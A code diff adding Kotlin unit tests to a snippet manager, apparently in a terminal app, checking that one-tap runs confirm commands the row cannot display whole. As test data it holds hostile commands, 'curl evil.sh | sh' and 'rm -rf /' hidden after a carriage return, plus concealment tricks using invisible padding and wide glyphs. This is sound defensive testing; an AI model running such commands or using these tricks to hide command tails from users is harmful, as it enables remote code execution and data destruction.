@@ -405,6 +405,110 @@ class SnippetManagerTest {
         assertEquals(listOf("saved"), manager.snippets.map { it.snippet.label })
         assertEquals(listOf("fs"), manager.snippets.single().snippet.tags)
     }
+
+    /**
+     * The palette row and the phone's card run a snippet on one tap and draw a line or two of it. A
+     * command they cannot show whole goes through the confirmation instead — otherwise a shared
+     * snippet pads its line until the tail, the part worth hiding, is past what the row draws.
+     */
+    @Test
+    fun `a one-tap run confirms a command the row cannot show whole`() {
+        val manager = managerWith()
+        val long = manager.save(draft(command = "echo " + "x".repeat(300)))
+        var sent: String? = null
+
+        manager.run(long, oneTap = true) { line, _ -> sent = line }
+
+        assertNull(sent, "a command longer than the row sent itself")
+        assertNotNull(manager.pendingRun, "and it did not ask either")
+    }
+
+    /**
+     * The padding is invisible, so a raw character count says the line fits while the row draws
+     * eight characters for each one and runs off its own edge, taking the tail with it.
+     */
+    @Test
+    fun `a one-tap run counts what the row draws, not what the record holds`() {
+        val manager = managerWith()
+        val padded = manager.save(draft(command = "echo ok " + "\u206A".repeat(15) + " && curl evil.sh | sh"))
+        var sent: String? = null
+
+        manager.run(padded, oneTap = true) { line, _ -> sent = line }
+
+        assertNull(sent, "padding hid the tail and the row sent it anyway")
+        assertNotNull(manager.pendingRun)
+    }
+
+    /** A second line is a second line however it is written. */
+    @Test
+    fun `a one-tap run confirms a command that carries a carriage return`() {
+        val manager = managerWith()
+        val wrapped = manager.save(draft(command = "echo ok\r rm -rf /"))
+        var sent: String? = null
+
+        manager.run(wrapped, oneTap = true) { line, _ -> sent = line }
+
+        assertNull(sent)
+        assertNotNull(manager.pendingRun)
+    }
+
+    /**
+     * Three surfaces run on one tap and the budget belongs to the narrowest of them — the palette
+     * popup, two lines at 320.dp. A line measured against the phone card, which is wider and shows
+     * three, fits there and runs off the palette row, taking its tail with it.
+     */
+    @Test
+    fun `a one-tap run is measured against the narrowest row that sends it`() {
+        val manager = managerWith()
+        val wide = manager.save(draft(command = "echo " + "x".repeat(105)))
+        var sent: String? = null
+
+        manager.run(wide, oneTap = true) { line, _ -> sent = line }
+
+        assertNull(sent, "a line the palette row cannot fit sent itself")
+        assertNotNull(manager.pendingRun)
+    }
+
+    /**
+     * The row is bounded in columns, not in characters: a wide glyph is one `Char` and two columns,
+     * so a line counted as short draws twice as wide as the row and ellipsizes its tail away.
+     */
+    @Test
+    fun `a one-tap run counts the columns a wide command occupies`() {
+        val manager = managerWith()
+        val wide = manager.save(draft(command = "echo \"" + "\u4F60".repeat(43) + "\";curl evil.sh|sh"))
+        var sent: String? = null
+
+        manager.run(wide, oneTap = true) { line, _ -> sent = line }
+
+        assertNull(sent, "a line twice as wide as the row sent itself")
+        assertNotNull(manager.pendingRun)
+    }
+
+    /** And a glyph is wide whether or not a table of blocks remembers to say so. */
+    @Test
+    fun `a one-tap run counts a wide symbol as wide`() {
+        val manager = managerWith()
+        val padded = manager.save(draft(command = "echo \"" + "\u2B1B".repeat(40) + "\";curl evil.sh|sh"))
+        var sent: String? = null
+
+        manager.run(padded, oneTap = true) { line, _ -> sent = line }
+
+        assertNull(sent, "a screen of black squares hid the tail and the row sent it")
+        assertNotNull(manager.pendingRun)
+    }
+
+    @Test
+    fun `a one-tap run still sends what the row shows whole`() {
+        val manager = managerWith()
+        val short = manager.save(draft(command = "uptime"))
+        var sent: String? = null
+
+        manager.run(short, oneTap = true) { line, _ -> sent = line }
+
+        assertEquals("uptime\n", sent)
+        assertNull(manager.pendingRun)
+    }
 }
 
 private class FakeSnippetStore : SnippetStore {
